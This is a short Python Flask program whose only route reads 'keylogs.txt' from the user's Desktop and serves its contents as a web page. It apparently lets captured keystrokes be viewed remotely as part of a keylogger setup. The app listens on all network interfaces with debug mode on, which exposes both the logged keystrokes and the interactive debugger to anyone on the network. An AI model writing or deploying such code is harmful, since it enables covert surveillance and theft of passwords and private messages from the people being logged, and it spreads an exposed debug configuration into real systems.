from flask import Flask, render_template
import os

app = Flask(__name__)

@app.route('/')
def home():
    desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    file_path = os.path.join(desktop, 'keylogs.txt')
    with open(file_path, 'r') as file:
        content = file.read()
    return render_template('index.html', content=content)

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')

